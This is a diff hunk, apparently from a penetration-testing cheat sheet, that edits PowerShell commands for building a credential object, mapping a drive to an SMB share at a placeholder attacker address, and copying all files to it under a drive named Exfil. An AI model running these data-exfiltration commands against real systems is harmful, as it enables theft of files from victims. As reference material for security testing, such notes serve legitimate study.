@@ -77,7 +77,7 @@ $Password = "Password"
 $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)
 
-PS C:\> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME" [-Credential $Credential] [-Persist]
+PS C:\> New-PSDrive -Name "<letter>" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME" [-Credential $Credential] [-Persist]
 PS C:\> copy * Exfil:\
 ```
 ## Copy
